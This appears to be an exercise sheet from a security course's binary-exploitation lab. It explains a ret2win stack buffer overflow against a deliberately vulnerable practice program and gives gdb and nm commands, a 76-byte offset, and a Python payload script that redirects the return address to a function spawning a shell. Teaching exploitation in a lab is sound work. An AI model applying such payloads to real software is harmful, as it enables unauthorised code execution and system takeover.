# Level 3 — "Root Shell" (Hard)

Level 2 injected code on the stack. Level 3 is cleaner and more modern:
you never put code on the stack. You overwrite the **saved return address**
with the address of an existing function, `root_shell()`, which runs
`system("/bin/sh")`.

**Win condition:** you get a shell prompt, and you saw

```text
*** ACCESS GRANTED :: SPAWNING ROOT SHELL ***
*** LEVEL 3 CLEARED ***
```

Type `id` or `whoami` in the shell, then `exit` when done.

You do **not** edit `vulnerable.c`. You craft the input payload.

---

## Idea

```text
buffer[64] | saved EBP (4) | saved return address (4)
                         overwrite this ----------^
                         with &root_shell
```

When `vulnerable()` returns, the CPU jumps to `root_shell()` instead of back
to `main`.

---

## Step 1 — Build

```bash
make
file vulnerable
```

## Step 2 — Find `root_shell`

```bash
gdb -q -batch -ex "info address root_shell" ./vulnerable
```

Or:

```bash
nm vulnerable | grep root_shell
```

## Step 3 — Find the offset

With `buffer[64]` plus compiler frame/alignment padding, the measured offset
on the course Docker image is:

```text
offset to return address = 76
```

Fill 76 bytes, then write the 4-byte little-endian address of `root_shell`.
(If you change compilers/flags, re-measure — do not trust `64 + 4` blindly.)

## Step 4 — Fire the payload

```python
import sys
import struct

root = 0x08049xxx   # from info address root_shell
offset = 76

payload = b"A" * offset + struct.pack("<I", root)
sys.stdout.buffer.write(payload)
```

```bash
python3 solve.py | ./vulnerable
```

You should land in a shell. Try:

```bash
id
whoami
exit
```

On a real Linux box with ASLR, prefer:

```bash
setarch "$(uname -m)" -R ./vulnerable
```

(Function addresses with `-no-pie` stay fixed; ASLR mainly moves the stack,
which matters less for this ret2win style exploit.)

## Step 5 — Submit

- Your payload / solve script
- The address of `root_shell` and the offset you used
- 4–6 sentences: how overwriting the return address transfers control, and
  how this differs from the Level 2 NOP-sled + shellcode approach

---

## What you should understand after this

- Control flow can be hijacked by overwriting a saved return address.
- **ret2win / return-to-function** reuses code already in the binary.
- This still works when the stack is **non-executable** (no shellcode needed).
- Real systems add more defenses (ASLR, canaries, PIE, RELRO, CFI) because
  these attacks are exactly why those defenses exist.
